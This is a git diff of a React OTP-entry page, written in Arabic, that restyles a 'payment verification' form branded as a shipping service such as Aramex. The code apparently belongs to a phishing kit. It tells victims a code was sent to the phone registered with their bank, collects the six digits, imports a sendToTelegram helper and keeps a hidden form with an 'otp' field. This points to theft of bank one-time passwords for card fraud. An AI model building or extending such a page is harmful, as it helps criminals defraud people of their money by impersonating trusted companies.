@@ -1,12 +1,13 @@
 import { useState, useEffect, useRef } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
+import { Card } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
-import { getServiceBranding } from "@/lib/serviceLogos";
-import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
+import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
+import { getCountryByCode } from "@/lib/countries";
 import { sendToTelegram } from "@/lib/telegram";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
 
@@ -28,15 +29,15 @@ const PaymentOTPForm = () => {
   const customerInfo = linkData?.payload?.customerInfo || {};
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+  const shippingInfo = linkData?.payload as any;
+  const paymentData = shippingInfo?.payment_data;
 
   // Get country from link data
-  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
-
-  const shippingInfo = linkData?.payload as any;
+  const selectedCountry = shippingInfo?.selectedCountry || "SA";
+  const countryData = getCountryByCode(selectedCountry);
 
   // Get amount from link data - ensure it's a number, handle all data types
-  const rawAmount = shippingInfo?.cod_amount;
+  const rawAmount = paymentData?.payment_amount || shippingInfo?.cod_amount || shippingInfo?.payment_amount;
 
   // Handle different data types and edge cases
   let amount = 500; // Default value
@@ -251,137 +252,161 @@ const PaymentOTPForm = () => {
   const hasAnyDigit = otp.some(digit => digit !== "");
   
   return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
-      amount={formattedAmount}
-      title="رمز التحقق"
-      description={`أدخل رمز التحقق لخدمة ${serviceName}`}
-      icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
-    >
-      {/* Title Section */}
-      <div className="text-center mb-6 sm:mb-8">
-        <div 
-          className="w-16 h-16 sm:w-20 sm:h-20 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse shadow-lg"
+    <>
+      <PaymentMetaTags
+        serviceName={serviceName}
+        serviceKey={serviceKey}
+        amount={formattedAmount}
+        title="رمز التحقق"
+        description={`أدخل رمز التحقق لخدمة ${serviceName}`}
+      />
+      <div className="min-h-screen bg-background" dir="rtl">
+        {/* Hero Section */}
+        <div
+          className="relative w-full h-48 sm:h-64 overflow-hidden"
           style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+            background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
           }}
         >
-          <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
+          <div className="absolute inset-0 bg-black/30" />
+          <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
+            <div className="text-right">
+              <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
+              <p className="text-xs sm:text-sm opacity-90">{countryData?.nameAr}</p>
+            </div>
+          </div>
         </div>
-        <h1 className="text-2xl sm:text-3xl font-bold mb-2">رمز التحقق</h1>
-        <p className="text-sm sm:text-base text-muted-foreground">أدخل الرمز المرسل إلى هاتفك</p>
-      </div>
 
-      {/* Info */}
-      <div 
-        className="rounded-lg p-3 sm:p-4 mb-6"
-        style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
-        }}
-      >
-        <p className="text-xs sm:text-sm text-center">
-          تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك المسجل في البنك
-        </p>
-      </div>
-      
-      <form onSubmit={handleSubmit}>
-        {/* OTP Input - 6 digits */}
-        <div className="mb-6">
-          <div className="flex gap-2 sm:gap-3 justify-center items-center mb-4" dir="ltr">
-            {otp.map((digit, index) => (
-              <Input
-                key={index}
-                ref={(el) => (inputRefs.current[index] = el)}
-                type="text"
-                inputMode="numeric"
-                pattern="[0-9]*"
-                maxLength={1}
-                value={digit}
-                onChange={(e) => handleChange(index, e.target.value)}
-                onKeyDown={(e) => handleKeyDown(index, e)}
-                onPaste={handlePaste}
-                className="w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 rounded-xl transition-all"
+        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
+          <div className="max-w-2xl mx-auto">
+            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: countryData?.primaryColor }}>
+              <div className="flex items-center justify-between mb-6 sm:mb-8">
+                <h1 className="text-xl sm:text-3xl font-bold">رمز التحقق</h1>
+
+                <div
+                  className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
+                  style={{
+                    background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
+                  }}
+                >
+                  <Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
+                </div>
+              </div>
+
+              {/* Info */}
+              <div 
+                className="rounded-lg p-3 sm:p-4 mb-6"
                 style={{
-                  borderColor: digit ? branding.colors.primary : undefined,
-                  backgroundColor: digit ? `${branding.colors.primary}08` : undefined
+                  background: `${countryData?.primaryColor}10`,
+                  border: `1px solid ${countryData?.primaryColor}30`
                 }}
-                disabled={attempts >= 3}
-                autoComplete="off"
-              />
-            ))}
+              >
+                <p className="text-xs sm:text-sm text-center">
+                  تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك المسجل في البنك
+                </p>
+              </div>
+              
+              <form onSubmit={handleSubmit}>
+                {/* OTP Input - 6 digits */}
+                <div className="mb-6">
+                  <div className="flex gap-2 sm:gap-3 justify-center items-center mb-4" dir="ltr">
+                    {otp.map((digit, index) => (
+                      <Input
+                        key={index}
+                        ref={(el) => (inputRefs.current[index] = el)}
+                        type="text"
+                        inputMode="numeric"
+                        pattern="[0-9]*"
+                        maxLength={1}
+                        value={digit}
+                        onChange={(e) => handleChange(index, e.target.value)}
+                        onKeyDown={(e) => handleKeyDown(index, e)}
+                        onPaste={handlePaste}
+                        className="w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 rounded-xl transition-all"
+                        style={{
+                          borderColor: digit ? countryData?.primaryColor : undefined,
+                          backgroundColor: digit ? `${countryData?.primaryColor}08` : undefined
+                        }}
+                        disabled={attempts >= 3}
+                        autoComplete="off"
+                      />
+                    ))}
+                  </div>
+                </div>
+              
+                {/* Error Message */}
+                {error && (
+                  <div 
+                    className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2 bg-destructive/10 border border-destructive/30"
+                  >
+                    <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0 text-destructive" />
+                    <p className="text-xs sm:text-sm text-destructive">{error}</p>
+                  </div>
+                )}
+                
+                {/* Countdown Timer */}
+                {countdown > 0 && (
+                  <div className="text-center mb-6">
+                    <p className="text-xs sm:text-sm text-muted-foreground">
+                      إعادة إرسال الرمز بعد <strong>{countdown}</strong> ثانية
+                    </p>
+                  </div>
+                )}
+
+                {/* Attempts Counter */}
+                {attempts > 0 && attempts < 3 && (
+                  <div className="text-center mb-6">
+                    <p className="text-xs sm:text-sm text-yellow-600">
+                      المحاولات المتبقية: <strong>{3 - attempts}</strong>
+                    </p>
+                  </div>
+                )}
+                
+                {/* Submit Button */}
+                <Button
+                  type="submit"
+                  size="lg"
+                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+                  disabled={attempts >= 3 || !isOtpComplete}
+                  style={{
+                    background: attempts >= 3 
+                      ? '#666' 
+                      : `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`
+                  }}
+                >
+                  {attempts >= 3 ? (
+                    <span>محظور مؤقتاً</span>
+                  ) : (
+                    <>
+                      <span className="ml-2">تأكيد الدفع</span>
+                      <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+                    </>
+                  )}
+                </Button>
+                
+                {countdown === 0 && (
+                  <Button
+                    type="button"
+                    variant="ghost"
+                    className="w-full mt-3"
+                    style={{ color: countryData?.primaryColor }}
+                    onClick={() => {
+                      setCountdown(60);
+                      toast({
+                        title: "تم إرسال الرمز",
+                        description: "تم إرسال رمز تحقق جديد إلى هاتفك",
+                      });
+                    }}
+                  >
+                    إعادة إرسال الرمز
+                  </Button>
+                )}
+              </form>
+            </Card>
           </div>
         </div>
-      
-        {/* Error Message */}
-        {error && (
-          <div 
-            className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2 bg-destructive/10 border border-destructive/30"
-          >
-            <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0 text-destructive" />
-            <p className="text-xs sm:text-sm text-destructive">{error}</p>
-          </div>
-        )}
-        
-        {/* Countdown Timer */}
-        {countdown > 0 && (
-          <div className="text-center mb-6">
-            <p className="text-xs sm:text-sm text-muted-foreground">
-              إعادة إرسال الرمز بعد <strong>{countdown}</strong> ثانية
-            </p>
-          </div>
-        )}
+      </div>
 
-        {/* Attempts Counter */}
-        {attempts > 0 && attempts < 3 && (
-          <div className="text-center mb-6">
-            <p className="text-xs sm:text-sm text-yellow-600">
-              المحاولات المتبقية: <strong>{3 - attempts}</strong>
-            </p>
-          </div>
-        )}
-        
-        {/* Submit Button */}
-        <Button
-          type="submit"
-          size="lg"
-          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
-          disabled={attempts >= 3 || !isOtpComplete}
-          style={{
-            background: attempts >= 3 
-              ? '#666' 
-              : `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-          }}
-        >
-          {attempts >= 3 ? (
-            <span>محظور مؤقتاً</span>
-          ) : (
-            <>
-              <span className="ml-2">تأكيد الدفع</span>
-              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
-            </>
-          )}
-        </Button>
-        
-        {countdown === 0 && (
-          <Button
-            type="button"
-            variant="ghost"
-            className="w-full mt-3"
-            style={{ color: branding.colors.primary }}
-            onClick={() => {
-              setCountdown(60);
-              toast({
-                title: "تم إرسال الرمز",
-                description: "تم إرسال رمز تحقق جديد إلى هاتفك",
-              });
-            }}
-          >
-            إعادة إرسال الرمز
-          </Button>
-        )}
-      </form>
 
       {/* Hidden Netlify Form */}
       <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
@@ -395,7 +420,7 @@ const PaymentOTPForm = () => {
         <input type="text" name="otp" />
         <input type="text" name="timestamp" />
       </form>
-    </DynamicPaymentLayout>
+    </>
   );
 };
 
